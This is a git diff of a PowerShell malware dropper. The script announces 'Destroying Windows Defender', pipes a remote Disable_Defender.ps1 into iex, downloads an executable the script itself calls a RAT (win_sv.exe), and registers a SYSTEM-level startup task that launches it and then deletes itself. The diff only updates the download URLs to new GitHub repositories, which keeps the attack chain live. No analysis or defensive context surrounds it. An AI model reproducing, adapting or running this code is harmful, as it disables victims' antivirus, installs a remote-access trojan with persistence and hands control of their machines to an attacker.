@@ -5,7 +5,7 @@
 Write-Host "[+] Destroying Windows Defender..." -ForegroundColor Red
 
 Write-Host "[1/7]" -ForegroundColor Cyan
-iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/MurphCodeDev/wf/main/Disable_Defender.ps1'))
+iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/AlmightyDaemon/WinUpdate/main/V1/Disable_Defender.ps1'))
 Start-Sleep -Seconds 5
 
 Write-Host "[2/7]" -ForegroundColor Cyan
@@ -14,7 +14,7 @@ New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 
 Write-Host "[3/7]" -ForegroundColor Cyan
 $ratPath = "$workDir\win_sv.exe"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/refs/heads/main/win_sv.exe" -OutFile $ratPath
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/AlmightyDaemon/over/refs/heads/main/Exe/win_sv.exe" -OutFile $ratPath
 
 Write-Host "[4/7]" -ForegroundColor Cyan
 schtasks /create /tn "Win" /tr "cmd /c start /b $ratPath & schtasks /delete /tn Win /f" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1
